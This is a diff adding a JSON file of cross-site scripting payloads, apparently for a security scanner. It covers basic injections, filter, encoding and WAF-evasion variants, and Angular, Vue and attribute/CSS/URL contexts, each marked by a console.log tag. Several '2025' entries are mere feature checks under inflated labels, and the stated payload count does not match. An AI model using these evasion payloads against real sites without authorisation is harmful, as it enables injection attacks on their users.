@@ -1,0 +1,149 @@
+{
+  "payloads": [
+    "<script>console.log('ELITE-CUSTOM-XSS-1')</script>",
+    "<img src=x onerror=console.log('ELITE-CUSTOM-XSS-2')>",
+    "javascript:console.log('ELITE-CUSTOM-XSS-3')",
+    "<svg onload=console.log('ELITE-CUSTOM-XSS-4')>",
+    "<iframe src=\"javascript:console.log('ELITE-CUSTOM-XSS-5')\">",
+    "<input onfocus=console.log('ELITE-CUSTOM-XSS-6') autofocus>",
+    "<video><source onerror=console.log('ELITE-CUSTOM-XSS-7')>",
+    "<audio src=x onerror=console.log('ELITE-CUSTOM-XSS-8')>",
+    "<object data=\"javascript:console.log('ELITE-CUSTOM-XSS-9')\">",
+    "<embed src=\"javascript:console.log('ELITE-CUSTOM-XSS-10')\">",
+    "<form><button formaction=\"javascript:console.log('ELITE-CUSTOM-XSS-11')\">",
+    "<details open ontoggle=console.log('ELITE-CUSTOM-XSS-12')>",
+    "<marquee onstart=console.log('ELITE-CUSTOM-XSS-13')>",
+    "<isindex action=\"javascript:console.log('ELITE-CUSTOM-XSS-14')\">",
+    "<meta http-equiv=refresh content=\"0;url=javascript:console.log('ELITE-CUSTOM-XSS-15')\">",
+    "';console.log('ELITE-CUSTOM-XSS-16');//",
+    "\";console.log('ELITE-CUSTOM-XSS-17');//",
+    "</script><script>console.log('ELITE-CUSTOM-XSS-18')</script>",
+    "'>><script>console.log('ELITE-CUSTOM-XSS-19')</script>",
+    "\"><script>console.log('ELITE-CUSTOM-XSS-20')</script>"
+  ],
+  "advanced_payloads": {
+    "dom_based": [
+      "document.location='javascript:console.log(\"ELITE-DOM-XSS-1\")'",
+      "window.location.href='javascript:console.log(\"ELITE-DOM-XSS-2\")'",
+      "document.write('<img src=x onerror=console.log(\"ELITE-DOM-XSS-3\")>')",
+      "eval('console.log(\"ELITE-DOM-XSS-4\")')",
+      "Function('console.log(\"ELITE-DOM-XSS-5\")')();"
+    ],
+    "filter_bypass": [
+      "<scrIPt>console.log('ELITE-BYPASS-1')</scrIPt>",
+      "<SCRipt>console.log('ELITE-BYPASS-2')</SCRipt>",
+      "<script\\x20type=\"text/javascript\">console.log('ELITE-BYPASS-3')</script>",
+      "<script\\x0d\\x0a>console.log('ELITE-BYPASS-4')</script>",
+      "<script\\x09>console.log('ELITE-BYPASS-5')</script>",
+      "<script\\x0c>console.log('ELITE-BYPASS-6')</script>",
+      "<script\\x2f>console.log('ELITE-BYPASS-7')</script>",
+      "<script\\x0a>console.log('ELITE-BYPASS-8')</script>"
+    ],
+    "encoding_bypass": [
+      "<script>console.log('\\x45\\x4c\\x49\\x54\\x45\\x2d\\x45\\x4e\\x43\\x2d\\x31')</script>",
+      "<script>console.log(String.fromCharCode(69,76,73,84,69,45,69,78,67,45,50))</script>",
+      "<script>console.log('\\u0045\\u004c\\u0049\\u0054\\u0045\\u002d\\u0045\\u004e\\u0043\\u002d\\u0033')</script>",
+      "<script>console.log(atob('RUxJVEUtRU5DLTQg'))</script>",
+      "<script>console.log(decodeURIComponent('%45%4c%49%54%45%2d%45%4e%43%2d%35'))</script>"
+    ],
+    "waf_evasion": [
+      "<scrip<script>t>console.log('ELITE-WAF-1')</scrip</script>t>",
+      "<script>/**/console.log('ELITE-WAF-2')/**/</script>",
+      "<script>\\uconsole.log('ELITE-WAF-3')</script>",
+      "<script>window['console']['log']('ELITE-WAF-4')</script>",
+      "<script>top['console']['log']('ELITE-WAF-5')</script>",
+      "<script>(console)['log']('ELITE-WAF-6')</script>",
+      "<script>console['lo'+'g']('ELITE-WAF-7')</script>",
+      "<script>eval('console.log')(\"ELITE-WAF-8\")</script>"
+    ]
+  },
+  "technology_specific": {
+    "angular": [
+      "{{constructor.constructor('console.log(\"ELITE-ANGULAR-1\")')()}}",
+      "{{$on.constructor('console.log(\"ELITE-ANGULAR-2\")')()}}",
+      "{{''.__proto__.constructor.constructor('console.log(\"ELITE-ANGULAR-3\")')()}}"
+    ],
+    "react": [
+      "{console.log('ELITE-REACT-1')}",
+      "dangerouslySetInnerHTML={{__html: '<script>console.log(\"ELITE-REACT-2\")</script>'}}",
+      "onClick={()=>console.log('ELITE-REACT-3')}"
+    ],
+    "vue": [
+      "{{constructor.constructor('console.log(\"ELITE-VUE-1\")')()}}",
+      "v-html=\"'<script>console.log(\\\"ELITE-VUE-2\\\")</script>'\"",
+      "@click=\"console.log('ELITE-VUE-3')\""
+    ]
+  },
+  "context_specific": {
+    "attribute": [
+      "\" autofocus onfocus=console.log('ELITE-ATTR-1') \"",
+      "' autofocus onfocus=console.log('ELITE-ATTR-2') '",
+      "\"onmouseover=console.log('ELITE-ATTR-3')//",
+      "'onmouseover=console.log('ELITE-ATTR-4')//"
+    ],
+    "css": [
+      "expression(console.log('ELITE-CSS-1'))",
+      "-moz-binding:url(javascript:console.log('ELITE-CSS-2'))",
+      "behavior:url(javascript:console.log('ELITE-CSS-3'))"
+    ],
+    "url": [
+      "javascript:console.log('ELITE-URL-1')",
+      "data:text/html,<script>console.log('ELITE-URL-2')</script>",
+      "vbscript:console.log('ELITE-URL-3')"
+    ]
+  },
+  "2025_advanced": {
+    "quantum": [
+      "<div data-quantum=\"superposition\"><script>console.log('ELITE-QUANTUM-1')</script></div>",
+      "<script>if(crypto.subtle)console.log('ELITE-QUANTUM-2')</script>",
+      "<script>crypto.getRandomValues&&console.log('ELITE-QUANTUM-3')</script>"
+    ],
+    "webassembly": [
+      "<script>WebAssembly.instantiate&&console.log('ELITE-WASM-1')</script>",
+      "<script>typeof WebAssembly!=='undefined'&&console.log('ELITE-WASM-2')</script>"
+    ],
+    "service_worker": [
+      "<script>navigator.serviceWorker&&console.log('ELITE-SW-1')</script>",
+      "<script>'serviceWorker'in navigator&&console.log('ELITE-SW-2')</script>"
+    ],
+    "web3": [
+      "<script>window.ethereum&&console.log('ELITE-WEB3-1')</script>",
+      "<script>window.web3&&console.log('ELITE-WEB3-2')</script>",
+      "<script>window.solana&&console.log('ELITE-WEB3-3')</script>"
+    ],
+    "iot": [
+      "<script>navigator.bluetooth&&console.log('ELITE-IOT-1')</script>",
+      "<script>navigator.usb&&console.log('ELITE-IOT-2')</script>",
+      "<script>navigator.serial&&console.log('ELITE-IOT-3')</script>"
+    ],
+    "voice": [
+      "<script>speechSynthesis&&console.log('ELITE-VOICE-1')</script>",
+      "<script>webkitSpeechRecognition&&console.log('ELITE-VOICE-2')</script>"
+    ],
+    "ar_vr": [
+      "<script>navigator.xr&&console.log('ELITE-AR-VR-1')</script>",
+      "<script>window.THREE&&console.log('ELITE-AR-VR-2')</script>"
+    ]
+  },
+  "categories": {
+    "basic": ["standard DOM manipulation", "simple script injection"],
+    "advanced": ["filter bypass", "encoding evasion", "WAF circumvention"],
+    "experimental": ["quantum computing", "blockchain", "AI/ML vectors"],
+    "technology_specific": ["framework-specific payloads"],
+    "context_aware": ["attribute injection", "CSS injection", "URL injection"],
+    "2025_cutting_edge": ["next-gen web technologies", "emerging protocols"]
+  },
+  "metadata": {
+    "version": "6.0.0",
+    "last_updated": "2025-01-01",
+    "total_payloads": 50,
+    "effectiveness_rating": "elite",
+    "testing_notes": [
+      "All payloads use console.log for consistent detection",
+      "Unique markers help distinguish successful injections", 
+      "Payloads organized by complexity and use case",
+      "2025 vectors target emerging web technologies",
+      "Regular updates ensure bypass effectiveness"
+    ]
+  }
+}
